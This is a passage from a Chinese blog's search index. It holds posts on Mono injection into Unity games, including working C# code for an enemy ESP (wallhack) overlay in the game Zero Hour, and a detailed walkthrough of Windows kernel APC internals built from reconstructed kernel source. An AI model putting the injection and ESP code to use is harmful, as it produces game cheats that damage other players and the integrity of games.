APC插入效果如图","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}]},{"title":"Mono注入（二）","slug":"MonoInjectII","date":"2021-08-12T05:36:15.000Z","updated":"2021-10-25T08:09:15.451Z","comments":true,"path":"2021/08/12/MonoInjectII/","link":"","permalink":"http://example.com/2021/08/12/MonoInjectII/","excerpt":"","text":"这次在上次mono注入的基础上，增加了人物透视的简单功能 下图是这一次测试的游戏，Zero Hour 通过dnspy，我们可以确定到AI类名为ZH_AINav，继而对该类的实例对象进行枚举绘制。 using System.Diagnostics.CodeAnalysis; using UnityEngine; namespace MonoInjectTemplate { public class HackMain : MonoBehaviour { public void Start() { } public void Update() { enemies = FindObjectsOfType&lt;ZH_AINav>(); _camera = Camera.main; } public void LateUpdate() { } public void FixedUpdate() { } public void OnGUI() { GUI.Label(new Rect(100,100,300,100),\"hello little hacker\"); foreach (var enemy in enemies) { Basic_ESP(enemy.transform,\"Enemy\"); } } private Vector3 W2S(Transform transform) { return _camera.WorldToScreenPoint(transform.position); } private void Basic_ESP(Transform transform, string text) { Vector3 screenVector3 = W2S(transform); if (screenVector3.z > 0) { GUI.Label( new Rect(screenVector3.x, Screen.height - screenVector3.y, screenVector3.x + 200, screenVector3.y + 50), text); } } private ZH_AINav[] enemies; private Camera _camera; } } 简单效果如下：","categories":[],"tags":[{"name":"游戏","slug":"游戏","permalink":"http://example.com/tags/%E6%B8%B8%E6%88%8F/"}]},{"title":"APC详细分析","slug":"APC-detail","date":"2021-08-11T06:55:15.000Z","updated":"2021-10-25T08:14:00.600Z","comments":true,"path":"2021/08/11/APC-detail/","link":"","permalink":"http://example.com/2021/08/11/APC-detail/","excerpt":"","text":"APC概念APC分为两种类型：内核APC、用户APC 用户模式APC运行在用户模式下的目标线程的当前上下文中，且需要获得目标线程的许可。 用户模式APC需要在目标线程处于alertable的等待状态才能被成功调度执行。 通过调度下面的任一函数，都可以让线程进入这种等待状态。 内核函数： KeWaitForSingleObject KeWaitForMultipleObjects KeWaitForMutexObject KeDelayExecutionThread 用户函数： SleepEx SignalObjectAndWait WaitForSingleObjectEx WaitForMultipleObjectsEx MsgWaitForMultipleObjectsEx 此外,通过调用一个未公开的alert-test服务KeTestAlertThread，用户线程可以使用户模式APC执行。 APC相关结构每一个线程都包含两个APC队列，一个为用户APC队列、一个为内核APC队列。这两个队列都存储在_KAPC_STATE结构体中。 typedef struct _KAPC_STATE { LIST_ENTRY ApcListHead[MaximumMode]; //线程的apc链表 只有两个 内核态和用户态 struct _KPROCESS *Process; //当前线程的进程体 PsGetCurrentProcess() BOOLEAN KernelApcInProgress; //内核APC正在执行 BOOLEAN KernelApcPending; //内核APC正在等待执行 BOOLEAN UserApcPending; //用户APC正在等待执行 } KAPC_STATE, *PKAPC_STATE, *PRKAPC_STATE; _KPAC_STATE结构体又存储于_KTHREAD中 ntdll!_KTHREAD +0x000 Header : _DISPATCHER_HEADER +0x010 MutantListHead : _LIST_ENTRY +0x018 InitialStack : Ptr32 Void +0x01c StackLimit : Ptr32 Void +0x020 Teb : Ptr32 Void +0x024 TlsArray : Ptr32 Void +0x028 KernelStack : Ptr32 Void +0x02c DebugActive : UChar +0x02d State : UChar +0x02e Alerted : [2] UChar +0x030 Iopl : UChar +0x031 NpxState : UChar +0x032 Saturation : Char +0x033 Priority : Char +0x034 ApcState : _KAPC_STATE //这里保存_KAPC_STATE +0x04c ContextSwitches : Uint4B ... +0x134 TrapFrame : Ptr32 _KTRAP_FRAME +0x138 ApcStatePointer : [2] Ptr32 _KAPC_STATE // +0x140 PreviousMode : Char +0x141 EnableStackSwap : UChar +0x142 LargeStack : UChar +0x143 ResourceIndex : UChar +0x144 KernelTime : Uint4B +0x148 UserTime : Uint4B +0x14c SavedApcState : _KAPC_STATE //这里保存_KAPC_STATE +0x164 Alertable : UChar +0x165 ApcStateIndex : UChar // 没有附加时，ApcState存储当前进程的APC队列当A进程附加到B进程，SaveApcState保存原来A进程的Apc队列，ApcState保存被附加B进程的Apc队列。 在_KTHREAD中， typedef enum _KAPC_ENVIRONMENT { OriginalApcEnvironment, //原始的进程环境 AttachedApcEnvironment, //挂靠后的进程环境 CurrentApcEnvironment, // 当前环境 InsertApcEnvironment //被插入时的环境 } KAPC_ENVIRONMENT; ApcStateIndex的值作为ApcStatePointer数组的索引来得到目标APC环境指针。 实际可用于ApcStateIndex的只有OriginalApcEnvironment(0)和AttachedApcEnvironment(1) 当ApcStateIndex为OriginalApcEnvironment时，Process指向当前的进程， 当为AttachedApcEnvironment时，ApcState指向挂靠的进程，SaveApcState指向的才是原来所属的进程 所以ApcState中的Process一直指向的是”当前进程”，PsGetCurrentProcess就是返回的ApcState中的Process, KeCurrentThread()-&gt;Process指向的是挂靠前的进程, 即”OriginalProcess”. 常态下ApcStatePointer[0]指向ApcState，而ApcStatePointer[1]指向SavedApcState，挂靠后相反。 APC结构体如下 typedef struct _KAPC { CSHORT Type; CSHORT Size; ULONG Spare0; struct _KTHREAD *Thread; LIST_ENTRY ApcListEntry; // 插入线程APC链表 PKKERNEL_ROUTINE KernelRoutine; //内核模式中执行 PKRUNDOWN_ROUTINE RundownRoutine; // 线程终止时还有APC没执行会调用这个函数 PKNORMAL_ROUTINE NormalRoutine; //这个为0 表示是一个特殊内核APC，否则是一个普通的（又分为内核态的和用户态的）。特殊的位于链表前部，普通的位于后部。 普通的APC，normal和kernel例程都将被调用 PVOID NormalContext; // // N.B. The following two members MUST be together. // PVOID SystemArgument1; PVOID SystemArgument2; CCHAR ApcStateIndex; //APC环境状态 KPROCESSOR_MODE ApcMode; // 内核态or用户态 BOOLEAN Inserted; } KAPC, *PKAPC, *RESTRICTED_POINTER PRKAPC; KeAttachProcess/KeDetachProcess当一个线程调用KeAttachProcess时，在另外的进程上下文中执行后续的代码时，ApcState的内容就被拷贝到SavedApcState。然后ApcState被清空，它的APC队列重新初始化，控制变量设置为0，当前进程设置为新的进程。 这些步骤成功的确保先前在线程所属的进程上下文地址空间中等待的APC得以保留，在当线程运行在其它不同的进程上下文时，这些APCs不被执行。 随后，ApcStatePointer数组内容被更新来反映新的状态，数组中第一个元素指向SavedApcState，第二个元素指向ApcState，表明线程所属进程上下文的APC环境位于SavedApcState。线程的新的进程上下文的APC环境位于ApcState。 最后，当前进程上下文切换到新的进程上下文。 KiMoveApcState(&amp;Thread->ApcState, SavedApcState); //当前的APC状态移到Save里，然后初始化apc状态 InitializeListHead(&amp;Thread->ApcState.ApcListHead[KernelMode]); //ApcState被初始化 InitializeListHead(&amp;Thread->ApcState.ApcListHead[UserMode]); Thread->ApcState.KernelApcInProgress = FALSE; Thread->ApcState.KernelApcPending = FALSE; Thread->ApcState.UserApcPending = FALSE; if (SavedApcState == &amp;Thread->SavedApcState) { Thread->ApcStatePointer[0] = &amp;Thread->SavedApcState; //第一个指向保存的apc状态 原始apc环境 Thread->ApcStatePointer[1] = &amp;Thread->ApcState; //第二个是当前的 挂靠apc环境 Thread->ApcStateIndex = 1; //表示现在的状态指向 指向挂靠状态 } 当线程从新的进程中脱离时(KeDetachProcess), 任何在新的进程地址空间中等待执行的内核APC首先被派发执行。 随后SavedApcState的内容被拷贝回ApcState。SavedApcState 的内容被清空。 线程的ApcStateIndex域被设为OriginalApcEnvironment，ApcStatePointer域更新，当前进程上下文切换到线程所属进程。 while (Thread->ApcState.KernelApcPending &amp;&amp; (Thread->SpecialApcDisable == 0) &amp;&amp; (LockHandle.OldIrql &lt; APC_LEVEL)) { // // Unlock the thread APC lock and lower IRQL to its previous // value. An APC interrupt will immediately occur which will // result in the delivery of the kernel APC if possible. //释放这个锁将导致 请求APC级别的中断，这样apc将得到释放 KeReleaseInStackQueuedSpinLock(&amp;LockHandle); KeAcquireInStackQueuedSpinLockRaiseToSynch(&amp;Thread->ApcQueueLock, &amp;LockHandle); } // //省略无关代码，到这里进行恢复 // KiMoveApcState(&amp;Thread->SavedApcState, &amp;Thread->ApcState); //恢复了 Thread->SavedApcState.Process = (PKPROCESS)NULL; Thread->ApcStatePointer[0] = &amp;Thread->ApcState; Thread->ApcStatePointer[1] = &amp;Thread->SavedApcState; Thread->ApcStateIndex = 0; // //ApcStatePointer这样设计是巧妙的 // 内核插入APC过程1、使用KeInitializeApc初始化apc结构体NTKERNELAPI VOID KeInitializeApc ( IN PRKAPC Apc, //APC对象 IN PKTHREAD Thread, //目标线程对象指针 IN KAPC_ENVIRONMENT Environment, //APC环境索引（指出APC对象存放于哪个APC环境） IN PKKERNEL_ROUTINE KernelRoutine, //Kernel 例程指针 IN PKRUNDOWN_ROUTINE RundownRoutine OPTIONAL, //rundown例程指针 IN PKNORMAL_ROUTINE NormalRoutine OPTIONAL, //normal 例程指针 IN KPROCESSOR_MODE ApcMode, //APC类型 （内核或用户模式） IN PVOID Context //真正我们实现的函数 ) { RtlZeroMemory(Apc,sizeof(KAPC)); Apc->Type = ApcObject; // APC是类型为ApcObejct的内核对象 Apc->Size = sizeof(KAPC); if (Environment == CurrentApcEnvironment) { //当前环境，那Index就是线程的 Apc->ApcStateIndex = Thread->ApcStateIndex; } else { ASSERT((Environment &lt;= Thread->ApcStateIndex) || (Environment == InsertApcEnvironment)); Apc->ApcStateIndex = (CCHAR)Environment; } Apc->Thread = Thread; Apc->KernelRoutine = KernelRoutine; Apc->RundownRoutine = RundownRoutine; Apc->NormalRoutine = NormalRoutine; /*Check if this a special APC*/ if(NormalRoutine) { //NormalRoutine非空,是需要在用户空间执行的APC函数 /*it's a normal one. Set the context and mode */ Apc->ApcMode = Mode; Apc->NormalContext = Context; //我们真正认为的APC执行函数 } else { //没有需要在用户空间执行的NormalRoutine /*it's a special APC,which can only be kernel mode*/ Apc->ApcMode = KernelMode; Apc->NormalContext = NULL; } Apc->Inserted = FALSE; KeInitializeApc首先设置APC对象的Type和Size域一个适当的值，然后检查参数Environment的值。 如果是CurrentApcEnvironment，那么ApcStateIndex设置为目标线程的ApcStateIndex。 否则，ApcStateIndex域设置为参数Environment的值。 随后，函数直接用参数设置APC对象Thread，RundownRoutine，KernelRoutine域的值。 为了正确地确定APC的类型，KeInitializeApc检查参数NORMAL_ROUTINE的值， 如果是NULL，ApcMode域的值设置为KernelMode，NormalContext域设置为NULL。 如果NORMAL_ROUTINE的值不是NULL，这时候它一定指向一个有效的例程，就用相应的参数来设置ApcMode域和NormalContext域。 最后，KeInitializeApc 设置Inserted域为FALSE。 然而初始化APC对象，并没有把它存放到相应的APC队列中。 从代码可以看出，APC对象如果缺少有效的NORMAL_ROUTINE，就会被当作内核模式APC。尤其是它们会被认为是特殊的内核模式APC. 任意类型的APC都可以定义一个有效的RundownRoutine，这个例程必须在内核内存区域，并且仅仅当系统需要释放APC队列的内容时，才被调用。 例如线程退出时，在这种情况下，KernelRoutine和NormalRoutine都不执行，只有RundownRoutine执行。没有这个例程的APC对象会被删除。 2、使用KeInsertQueueApc函数将apc对象插入apc队列APC对象完成初始化后，设备驱动调用KeInsertQueueApc来将APC对象存放到目标线程的相应的APC队列中。 这个函数接受一个由KeInitializeApc完成初始化的APC对象指针，两个系统参数和一个优先级增量。 跟传递给KeInitializeApc函数的参数context一样，这两个系统参数只是在APC的例程执行时，简单的传递给APC的例程。 BOOLEAN KeInsertQueueApc( PRKAPC Apc, PVOID SystemArgument1, PVOID SystemArgument2, KPRIORITY Increment ) { PKTHREAD Thread = Apc->Thread; KeAcquireInStackQueuedSpinLockRaiseToSynch(&amp;Thread->ApcQueueLock, &amp;LockHandle); //升到synch_level获取apc锁 if ((Thread->ApcQueueable == FALSE) || //线程退出时不接受APC (Apc->Inserted == TRUE)) { Inserted = FALSE; } else { Apc->Inserted = TRUE; Apc->SystemArgument1 = SystemArgument1; Apc->SystemArgument2 = SystemArgument2; KiInsertQueueApc(Apc, Increment); Inserted = TRUE; } // // Unlock the thread APC queue lock, exit the scheduler, and return // whether the APC was inserted. // KeReleaseInStackQueuedSpinLockFromDpcLevel(&amp;LockHandle); KiExitDispatcher(LockHandle.OldIrql); } BOOLEAN KiInsertQueueApc( IN PKAPC Apc, IN KPRIORITY Increment ) { Thread = Apc->Thread; if (Apc->ApcStateIndex == InsertApcEnvironment) { //被插入线程的环境，这里面赋值 Apc->ApcStateIndex = Thread->ApcStateIndex; } ApcState = Thread->ApcStatePointer[Apc->ApcStateIndex]; ApcMode = Apc->ApcMode; ASSERT (Apc->Inserted == TRUE); if (Apc->NormalRoutine != NULL) { if ((ApcMode != KernelMode) &amp;&amp; (Apc->KernelRoutine == PsExitSpecialApc)) {//用户模式 Thread->ApcState.UserApcPending = TRUE; InsertHeadList(&amp;ApcState->ApcListHead[ApcMode], &amp;Apc->ApcListEntry); } else {//普通内核模式 插入尾部 InsertTailList(&amp;ApcState->ApcListHead[ApcMode], &amp;Apc->ApcListEntry); } } else {//特殊内核模式 找到最后一个特殊APC 插入 始终保持特殊APC在普通的前面，又要保证插入是按照时间顺序的。 ListEntry = ApcState->ApcListHead[ApcMode].Blink; while (ListEntry != &amp;ApcState->ApcListHead[ApcMode]) { ApcEntry = CONTAINING_RECORD(ListEntry, KAPC, ApcListEntry); if (ApcEntry->NormalRoutine == NULL) { break; } ListEntry = ListEntry->Blink; } InsertHeadList(ListEntry, &amp;Apc->ApcListEntry); } if (Apc->ApcStateIndex == Thread->ApcStateIndex) { //是线程有的状态环境 0 or 1 原始或者挂靠的环境，另外两种状态已经在之前解决掉了 现在只有这两种。并且当现在状态相同，可以尝试让apc立即执行起来 // // If the target thread is the current thread, then the thread state // is running and cannot change. // if (Thread == KeGetCurrentThread()) {//插入的就是当前线程 ASSERT(Thread->State == Running); // // If the APC mode is kernel, then set kernel APC pending and // request an APC interrupt if special APC's are not disabled. // if (ApcMode == KernelMode) {//内核态apc 直接请求apc中断 Thread->ApcState.KernelApcPending = TRUE; if (Thread->SpecialApcDisable == 0) { KiRequestSoftwareInterrupt(APC_LEVEL); } } return; } RequestInterrupt = FALSE; KiLockDispatcherDatabaseAtSynchLevel(); if (ApcMode == KernelMode) { Thread->ApcState.KernelApcPending = TRUE; KeMemoryBarrier(); ThreadState = Thread->State; if (ThreadState == Running) {//线程正在运行 请求中断 RequestInterrupt = TRUE; } else if ((ThreadState == Waiting) &amp;&amp; //线程处于等待状态，唤醒这个线程 在KiUnwaitThread调用 KiReadyThread 这里面会交付APC (Thread->WaitIrql == 0) &amp;&amp; (Thread->SpecialApcDisable == 0) &amp;&amp; ((Apc->NormalRoutine == NULL) || ((Thread->KernelApcDisable == 0) &amp;&amp; (Thread->ApcState.KernelApcInProgress == FALSE)))) { KiUnwaitThread(Thread, STATUS_KERNEL_APC, Increment); } else if (Thread->State == GateWait) { //门等待 从门等待中拆出来 直接插入备用链表 KiAcquireThreadLock(Thread); if ((Thread->State == GateWait) &amp;&amp; (Thread->WaitIrql == 0) &amp;&amp; (Thread->SpecialApcDisable == 0) &amp;&amp; ((Apc->NormalRoutine == NULL) || ((Thread->KernelApcDisable == 0) &amp;&amp; (Thread->ApcState.KernelApcInProgress == FALSE)))) { GateObject = Thread->GateObject; KiAcquireKobjectLock(GateObject); RemoveEntryList(&amp;Thread->WaitBlock[0].WaitListEntry); KiReleaseKobjectLock(GateObject); if ((Queue = Thread->Queue) != NULL) { Queue->CurrentCount += 1; } Thread->WaitStatus = STATUS_KERNEL_APC; KiInsertDeferredReadyList(Thread); } KiReleaseThreadLock(Thread); } } else if ((Thread->State == Waiting) &amp;&amp; (Thread->WaitMode == UserMode) &amp;&amp; (Thread->Alertable || Thread->ApcState.UserApcPending)) {//用户模式 正在等待 并且可以唤醒 调用 KiUnwaitThread Thread->ApcState.UserApcPending = TRUE; KiUnwaitThread(Thread, STATUS_USER_APC, Increment); } //其他的情况只能等待其他机会执行APC了 // // Unlock the dispatcher database and request an APC interrupt if // required. // //如果有请求中断 这里执行一个 KiUnlockDispatcherDatabaseFromSynchLevel(); if (RequestInterrupt == TRUE) { KiRequestApcInterrupt(Thread->NextProcessor); } } return; } 在KeInsertQueueApc中，将APC对象存放到目标线程相应的APC队列之前，它首先检查目标线程是否是APC queueable。 如果不是，函数立即返回FALSE。 如果是，函数直接用参数设置SystemArgument1和SystemArgument2， 随后，函数调用KiInsertQueueApc来将APC对象存放到相应的APC队列。 KiInsertQueueApc中接受一个APC对象和一个优先级增量。 这个函数首先得到线程APC队列并且持有它，防止其他线程修改当前线程的APC结构。 随后，检查APC对象的Inserted。 如果是TRUE，表明这个APC对象已经存放到APC队列中了，函数立即返回FALSE。 如果是FALSE，函数通过ApcStateIndex来确定目标APC环境，然后把APC对象存放到相应的APC队列中，即将APC对象中的ApcListEntry链入到APC环境的ApcListHead中。 链入的位置由APC的类型决定。常规的内核模式APC，用户模式APC都是存放到相应的APC队列的末端。 相反的，如果队列中已经存放了一些APC对象，特殊的内核模式APC存放到队列中第一个常规内核模式APC对象的前面。 如果是内核定义的一个当线程退出时使用的用户APC，它也会被放在相应的队列的前面。 然后，线程的主APC环境中的UserApcPending被设置为TRUE。 这时KiInsertQueueApc设置APC对象的Inserted为TRUE，表明这个APC对象已经存放到APC队列中了。 接下来，检查这个APC对象是否被排队到线程的当前进程上下文APC环境中， 如果不是，函数立即返回TRUE。 如果这是一个内核模式APC，线程主APC环境中的KernelApcPending域设置为TRUE。 3、APC的执行过程分析APC的执行过程分为内核执行过程和用户执行过程两部分 VOID KiDeliverApc ( IN KPROCESSOR_MODE PreviousMode, IN PKEXCEPTION_FRAME ExceptionFrame, IN PKTRAP_FRAME TrapFrame ) { PKTHREAD Thread = KeGetCurrentThread(); PKPROCESS Process =Thread->ApcState.Process; ... ASSERT_IRQL_EQUAL(APC_LEVEL); //更换陷阱帧 OldTrapFrame = Thread->TrapFrame; Thread->TrapFrame = TrapFrame; //Clear Kernel APC Pending Thread->ApcState.KernelApcPending = FALSE; //Check if Special APCs are disabled if (Thread->SpecialApcDisable == 0) { //先处理内核模式APC队列中的每一项 while (IsListEmpty(&amp;Thread->ApcState.ApcListHead[KernelMode]) == FALSE) { //只处理当前线程当前状态环境下的dpc KeAcquireInStackQueuedSpinLock(&amp;Thread->ApcQueueLock, &amp;LockHandle); NextEntry = Thread->ApcState.ApcListHead[KernelMode].Flink; //Check if the list became empty now if (NextEntry == &amp;Thread->ApcState.ApcListHead[KernelMode]) { //到这已经空了释放并退出 KeReleaseInStackQueuedSpinLock(&amp;LockHandle); break; } // // Clear kernel APC pending, get the address of the APC object, // and determine the type of APC. // // N.B. Kernel APC pending must be cleared each time the kernel // APC queue is found to be non-empty. // Thread->ApcState.KernelApcPending = FALSE; Apc = CONTAINING_RECORD(NextEntry, KAPC, ApcListEntry); ReadForWriteAccess(Apc); KernelRoutine = Apc->KernelRoutine; NormalRoutine = Apc->NormalRoutine; NormalContext = Apc->NormalContext; SystemArgument1 = Apc->SystemArgument1; SystemArgument2 = Apc->SystemArgument2; if (NormalRoutine == (PKNORMAL_ROUTINE)NULL) { //没有NormalRoutine 特殊APC RemoveEntryList(NextEntry); Apc->Inserted = FALSE; KeReleaseInStackQueuedSpinLock(&amp;LockHandle); //调用APC (KernelRoutine)(Apc, &amp;NormalRoutine, &amp;NormalContext, &amp;SystemArgument1, &amp;SystemArgument2); } else { //普通的内核apc if ((Thread->ApcState.KernelApcInProgress == FALSE) &amp;&amp;(Thread->KernelApcDisable == 0)) { RemoveEntryList(NextEntry); Apc->Inserted = FALSE; KeReleaseInStackQueuedSpinLock(&amp;LockHandle); (KernelRoutine)(Apc, //普通的apc 比如nt!KiSuspendThread &amp;NormalRoutine, //NormalRoutine可能会在这里被改成0，如果没改成0继续执行 &amp;NormalContext, &amp;SystemArgument1, &amp;SystemArgument2); //还要调用Normal if (NormalRoutine != (PKNORMAL_ROUTINE)NULL) { //比如这可能是是nt!KiSuspendNop 啥也不干直接返回 Thread->ApcState.KernelApcInProgress = TRUE; //在这个apc执行的时候 其他的普通apc不会被交付 KeLowerIrql(0);//这里normal和kernel的irql也不一样，normal在passive运行 (NormalRoutine)(NormalContext, SystemArgument1, SystemArgument2); KeRaiseIrql(APC_LEVEL, &amp;LockHandle.OldIrql); } Thread->ApcState.KernelApcInProgress = FALSE; } else { KeReleaseInStackQueuedSpinLock(&amp;LockHandle); goto CheckProcess; } } } 在内核APC模式下，PreviousMode表示需要投递的哪一种APC，可以是KernelMode，也可以是UserMode。 如果是UserMode表示先执行内核模式队列中的APC请求，再执行内核模式队列中的APC请求。 如果是KernelMode，表示只执行内核模式队列中的APC请求。 此外，不管是内核模式还是用户模式，APC请求中一定有KernelRoutine，而NormalRoutine则可能有也可能没有。 KTHREAD中有两个KAPC_STATE数据结构，一个是ApcState，另一个是SavedApcState。 两者都有APC队列，但是要分派的是ApcState中的队列。 内核模式队列中执行APC是一次执行该队列中的所有APC请求， 而用户模式队列中执行用户APC却只执行其中的第一项APC请求。 所以首先通过一个while循环检查内核模式APC队列。 如果NormalRoutine为NULL，这是一种特殊情况，执行KernelRoutine所指的内核函数。 如果NormalRoutine非空，那么首先调用的是KernelRoutine，而指针NormalRoutine的地址作为参数传递下去，KernelRoutine的执行可能改变这个指针的值。 如果执行KernelRoutine之后NormalRoutine仍然非空，那么调用这个函数，虽然在内核执行，但是在PASSIVE_LEVEL级别上运行的，而不是APC_LEVEL级别。 if ((PreviousMode == UserMode) &amp;&amp; (IsListEmpty(&amp;Thread->ApcState.ApcListHead[UserMode]) == FALSE) &amp;&amp; (Thread->ApcState.UserApcPending != FALSE)) { KeAcquireInStackQueuedSpinLock(&amp;Thread->ApcQueueLock, &amp;LockHandle); Thread->ApcState.UserApcPending = FALSE; NextEntry = Thread->ApcState.ApcListHead[UserMode].Flink; if (NextEntry == &amp;Thread->ApcState.ApcListHead[UserMode]) { KeReleaseInStackQueuedSpinLock(&amp;LockHandle); goto CheckProcess; } //获得APC对象 Apc = CONTAINING_RECORD(NextEntry, KAPC, ApcListEntry); ReadForWriteAccess(Apc); KernelRoutine = Apc->KernelRoutine; NormalRoutine = Apc->NormalRoutine; NormalContext = Apc->NormalContext; SystemArgument1 = Apc->SystemArgument1; SystemArgument2 = Apc->SystemArgument2; RemoveEntryList(NextEntry); //从队列中摘下APC请求 Apc->Inserted = FALSE; KeReleaseInStackQueuedSpinLock(&amp;LockHandle); //Call the kernelroutine (KernelRoutine)(Apc, //用户态时这里很常见的是nt!IopDeallocateApc &amp;NormalRoutine, &amp;NormalContext, &amp;SystemArgument1, &amp;SystemArgument2); if (NormalRoutine == (PKNORMAL_ROUTINE)NULL) { //Check if more User APCs are pending KeTestAlertThread(UserMode); } else { //NormalRoutine 非空，为在用户空间执行APC函数做准备 //Set up the Trap Frame and prepare for Execution in NTDLL.DLL KiInitializeUserApc(ExceptionFrame, TrapFrame, NormalRoutine, NormalContext, SystemArgument1, SystemArgument2); } } } 内核APC的执行时无条件的，只要队列非空就要执行，而用户APC是有条件的。 第一:用户APC队列非空，第二:调用参数DeliveryMode必须是UserMode，也就是即将返回到用户空间，并且ApcState中的UserApcPending为TRUE，表示队列中的请求却是是要求执行的。 与内核APC队列相比，用户APC这次进入KiDeliverApc()只处理用户APC队列中的第一个请求。 先执行KernelRoutine。如果执行完之后，NormalRoutine为NULL，那么执行KeTestAlertThread()，检测是否还有用户APC请求。 如果执行完之后，NormalRoutine不为NULL，那么执行KiInitializeUserApc()，而不是直接调用NormalRoutine，因为用户模式的NormalRoutine是在用户空间，要等cpu回到用户模式时才执行。 所以要做一些准备，KiInitializeUserApc()的实参ExceptionFrame和TrapFrame都是从KiServiceExit()传下来的。 VOID NTAPI KiInitializeUserApc(IN PKEXCEPTION_FRAME ExceptionFrame, IN PKTRAP_FRAME TrapFrame,IN PKNORMAL_ROUTINE NormalRoutine, IN PVOID NormalContext,IN PVOID SystemArgument1,IN PVOID SystemArgument2) { CONTEXT Context; .... //Don't deliver APCs in V86 mode if(TrapFrame->EFlags&amp;EFLAFGS_V86_MASK) return; //save the full context 将系统空间堆栈上的自陷框架转换成CONTEXT结构 Context.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS; KeTrapFrameToContext(TrapFrame,ExceptionFrame,&amp;Context); //Protect with SEH 对用户空间堆栈的操作可能引起异常 ， 如地址错误 _SEH_TRY { //Sanity check ASSERT(TrapFrame->SegCs &amp; MODE_MASK)!= KernelMode); //Get the aligned size AlignedEsp = Context.Esp &amp;~ 3 ; //保证边界对齐 ContextLength = CONTEXT_ALIGNED_SIZE + (4*sizeof(ULONG_PTR)); Stack = ((AlignedEsp -8 )&amp;~3)- ContextLength; //调整用户空间堆栈指针 //Probe the stack ProbeForWrite((PVOID)Stack,AlignedEsp-Stack,1); ASSERT(!Stack&amp;3); //Copy data into it 将Context构复制到用户空间堆栈 RtlCooyMemory((PVOID)(Stack + (4*sizeof(ULONG_PTR))),&amp;CONTEXT,sizeof(CONTEXT)); //修改系统空间上的自陷框架 TrapFrame->Eip = (ULONG)KeUserApcDispatcher; //用户空间的EIP TrapFrame->HardwareEsp = Stack ; //用户空间堆栈位置已有变化 //Set R3 State TrapFrame->SegCs = Ke386SanitizeSeg(KGDT_R3_CODE,UserMode); TrapFrame->HardwareSegSs = Ke386SanitizeSeg(KGDT_R3_DATA,UserMode); TrapFrame->SegDs = Ke386SanitizeSeg(KGDT_R3_DATA,UserMode); TrapFrame->SegEs = Ke386SanitizeSeg(KGDT_R3_DATA,UserMode); TrapFrame->Fs = Ke386SanitizeSeg(KGDT_R3_TEB,UserMode); TrapFrame->SegGs = 0; //Sanitize EFLAGS TrapFrame->EFlags = Ke386SanitizeFlags(Context.EFlags,UserMode); //check if thread has IOPL and force it enabled if so if(KeGetCurrentThread()->Iopl) TrapFrame->EFlags|= 0x3000; //修改用户空间堆栈 *(PULONG_PTR)(Stack + 0* sizeof(ULONG_PTR)) = (ULONG_PTR)NormalRoutine; *(PULONG_PTR)(Stack + 1* sizeof(ULONG_PTR)) = (ULONG_PTR)NormalContext; *(PULONG_PTR)(Stack + 2* sizeof(ULONG_PTR)) = (ULONG_PTR)SystemArgument1; *(PULONG_PTR)(Stack + 3* sizeof(ULONG_PTR)) = (ULONG_PTR)SystemArgument2; } _SEH_EXCEP(KiCopyInformation2) { //如果在上面受保护的操作中发生异常 _SEH_VAR(SehExcepRecord).ExceptionAddress = (PVOID)TrapFrame->Eip; KiDispatchException(&amp;SehExceptRecord,ExceptionFrame,TrapFrame,UserMode,TRUE); } } (1) 首先CPU进入内核，在内核的堆栈上就会有一个框架（_KTRAP_FRAME)，用来保存用户空间的现场，因进入内核的原因不同，这个框架可以被称为自陷框架、中断框架、异常框架，不管什么框架，其内容格式是一样的，CPU在返回用户空间时将用到这个框架内容，保证CPU能正确的返回原先的断点。 (2)既然要让CPU返回用户空间时先执行我们的apc函数，就要修改这个框架内容，还要在执行完成之后回到之前的断点，所以这里首先将框架原来的内容保存起来，等执行完成之后在重入内核时恢复。但是保存在哪里呢？保存在当前线程的用户空间堆栈上是最合理的，需要把框架上内容复制到一个数据结构上，数据结构在保存在用户空间堆栈上，这个数据结构就是CONTEXT结构。 (3)CPU在执行完成APC函数之后，需要执行一个系统调用NtContinue()，并将指向用户空间堆栈上的CONTEXT结构作为参数，这样就可以还原到原先的断点。 这个函数代码分成三部分: 第一部分通过KeTrapFrameToContext()将此时的自陷框架内容复制在Context中， 第二部分将Context复制到用户空间堆栈上，在加上四个32位整数的位置，分别是NormalRoutine、NormalContext、SystemArgument1和SystemArgument2。 第三部分修改当前自陷框架的内容，将EIP指向用户空间的KiUserApcDispatcher()，修改ESP。 KiUserApcDispatcher是由ntdll.dll提供的函数，负责调用NormalRoutine和NtContinue函数。 在NormalRoutine函数中调用我们的NormalContext(我们真正认为的APC函数)函数 到这里，差不多就完成了整个分析。","categories":[],"tags":[{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"},{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"Mono注入（一）","slug":"MonoInjection","date":"2021-08-10T17:38:40.000Z","updated":"2021-10-25T08:09:07.716Z","comments":true,"path":"2021/08/11/MonoInjection/","link":"","permalink":"http://example.com/2021/08/11/MonoInjection/","excerpt":"","text":"了解Unity的生命周期，是MONO注入的一个基础。 附上Unity的生命周期图 略微了解上述生命周期后，尝试对其中流程进行注入 首先创建一个loader类 using UnityEngine; namespace MonoInjectTemplate { public class Loader { private static readonly GameObject mGameObject = new GameObject(); public static void Load() { mGameObject.AddComponent&lt;HackMain>(); Object.DontDestroyOnLoad(mGameObject); } public static void Unload() { Object.Destroy(mGameObject); } } } 然后再是我们的主类，其中我们的主类继承了MonoBehaviour using System.Diagnostics.CodeAnalysis; using UnityEngine; namespace MonoInjectTemplate { [SuppressMessage(\"ReSharper\",\"Unity.RedundantEventFunction\")] public class HackMain : MonoBehaviour { public void Start() { } public void Update() { } public void LateUpdate() { } public void FixedUpdate() { } public void OnGUI() { GUI.Label(new Rect(100,100,100,100),\"Hello Little Mono Hacker!!!\"); } } } 然后编译，使用注入器注入MONO 最终效果如下：","categories":[],"tags":[{"name":"游戏","slug":"游戏","permalink":"http://example.com/tags/%E6%B8%B8%E6%88%8F/"}]},{"title":"内核使用APC","slug":"KernalAPC","date":"2021-08-09T15:49:35.000Z","updated":"2021-10-25T08:09:56.726Z","comments":true,"path":"2021/08/09/KernalAPC/","link":"","permalink":"http://example.com/2021/08/09/KernalAPC/","excerpt":"","text":"头文件： #pragma once #include &lt;ntifs.h> typedef enum _KAPC_ENVIRONMENT { OriginalApcEnvironment, AttachedApcEnvironment, CurrentApcEnvironment, InsertApcEnvironment } 